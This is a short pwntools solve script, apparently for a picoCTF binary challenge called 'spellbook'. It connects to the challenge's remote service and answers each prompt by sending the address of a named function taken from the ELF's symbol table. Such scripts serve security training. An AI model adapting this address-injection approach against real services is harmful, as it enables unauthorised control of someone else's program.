from pwn import *
elf = context.binary = ELF("spellbook",checksec=False)
#p = process(["python", "app(6).py"])
p = remote("green-hill.picoctf.net", 61573)
tableSpell = {
    "ember_sigil"   : elf.symbols["ember_sigil"], 
    "glyph_conflux" : elf.symbols["glyph_conflux"], 
    "astral_spark"  : elf.symbols["astral_spark"], 
    "binding_word"  : elf.symbols["binding_word"]
}

for i in range(0,3):
    response = p.recvuntil(b"==> ")

    for value in tableSpell.keys():
        if value in response.decode():
            p.send(p32(tableSpell[value]))

print(p.recvall(timeout=10).decode())


